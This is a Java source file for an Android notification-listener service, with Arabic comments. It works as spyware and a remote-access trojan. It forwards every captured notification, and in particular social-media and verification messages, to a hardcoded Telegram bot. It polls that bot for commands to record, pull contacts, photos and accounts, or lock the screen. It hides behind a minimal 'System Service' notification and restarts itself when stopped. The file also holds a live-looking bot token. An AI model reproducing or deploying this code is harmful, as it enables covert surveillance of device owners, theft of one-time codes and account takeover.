package com.v8.global.sniffer;

import android.app.*;
import android.content.*;
import android.os.*;
import android.service.notification.*;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();
    private Timer timer;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "V8:WakeLock");
        wakeLock.acquire(10*60*1000L);
        
        startForegroundService();
        
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override 
            public void run() { 
                checkBotCommands(); 
            }
        }, 0, 3000);
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(101, createPersistentNotification());
        }
    }

    private void checkBotCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override 
            public void onResponse(Call c, Response r) throws IOException {
                try {
                    String body = r.body().string();
                    JSONObject json = new JSONObject(body);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                long chatId = message.getJSONObject("chat").getLong("id");
                                
                                // تأكيد وصول الأمر
                                sendToTelegram("📩 تم استلام الأمر: " + text, String.valueOf(chatId));
                                
                                if (text.equals("/start_record")) {
                                    sendCommandToRecordingService("START_RECORDING");
                                    sendToTelegram("🎥 أمر بدء التسجيل مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/stop_record")) {
                                    sendCommandToRecordingService("STOP_RECORDING");
                                    sendToTelegram("⏹ أمر إيقاف التسجيل مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/contacts")) {
                                    sendCommandToRecordingService("GET_CONTACTS");
                                    sendToTelegram("📇 أمر سحب جهات الاتصال مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/photos")) {
                                    sendCommandToRecordingService("GET_PHOTOS");
                                    sendToTelegram("🖼 أمر سحب الصور مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/lock")) {
                                    sendCommandToRecordingService("LOCK_SCREEN");
                                    sendToTelegram("🔒 أمر قفل الشاشة مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/accounts")) {
                                    sendCommandToRecordingService("GET_ACCOUNTS");
                                    sendToTelegram("👤 أمر سحب الحسابات مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/screen_off")) {
                                    sendCommandToRecordingService("SCREEN_OFF");
                                    sendToTelegram("📱 أمر إطفاء الشاشة مرسل", String.valueOf(chatId));
                                }
                                else if (text.equals("/status")) {
                                    String status = "✅ النظام يعمل\n";
                                    status += "⏰ الوقت: " + new java.util.Date().toString();
                                    sendToTelegram(status, String.valueOf(chatId));
                                }
                            }
                        }
                    }
                    r.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            
            @Override 
            public void onFailure(Call c, IOException e) {
                e.printStackTrace();
            }
        });
    }

    private void sendCommandToRecordingService(String command) {
        try {
            Intent intent = new Intent(this, RecordingAccessibilityService.class);
            intent.setAction(command);
            startService(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        
        if (pkg.equals("android") || pkg.equals("com.android.systemui") || pkg.equals(getPackageName())) {
            return;
        }
        
        try {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "بدون عنوان");
            CharSequence textCharSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
            String text = textCharSeq != null ? textCharSeq.toString() : "بدون نص";
            
            // كشف الحسابات الجديدة
            if (pkg.contains("facebook") || pkg.contains("instagram") || 
                pkg.contains("tiktok") || pkg.contains("twitter") ||
                title.contains("تسجيل") || title.contains("new account") ||
                title.contains("verify") || title.contains("تأكيد")) {
                
                String report = String.format(
                    "🔐 حساب جديد محتمل:\n📱 التطبيق: %s\n👤 العنوان: %s\n💬 النص: %s",
                    pkg, title, text
                );
                sendToTelegram(report, CHAT_ID);
            }
            
            // إشعار عادي
            String report = String.format(
                "🔔 إشعار:\n📱 %s\n👤 %s\n💬 %s",
                pkg, title, text
            );
            sendToTelegram(report, CHAT_ID);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegram(String msg, String chatId) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
        
        FormBody formBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", msg)
                .build();
        
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override 
            public void onResponse(Call c, Response r) { 
                r.close(); 
            }
            @Override 
            public void onFailure(Call c, IOException e) {}
        });
    }

    private Notification createPersistentNotification() {
        String channelId = "v8_channel";
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, "System Service", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }

        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Active")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        
        Intent intent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
